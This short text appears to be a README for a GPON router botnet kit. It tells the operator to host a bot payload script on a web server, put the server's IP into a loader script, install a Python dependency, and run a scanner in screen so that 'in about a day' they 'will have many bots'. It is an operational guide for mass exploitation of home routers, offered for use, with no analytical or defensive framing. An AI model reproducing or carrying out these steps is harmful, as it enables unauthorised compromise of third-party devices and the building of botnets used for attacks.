On your host server, we need to copy your bins.sh ( shell file ) to be the name of the shell file in your Gpon, so do this:

cp /var/www/html/9Cad.sh /var/www/html/bin

in the gloader.py replace your ip with the ip(s) in there, and your ready to scan.

run: yum install python-requests

drag all the files on your server and do:
screen
sh gpon.sh

in about a day or so you will have many bots. Enjoy
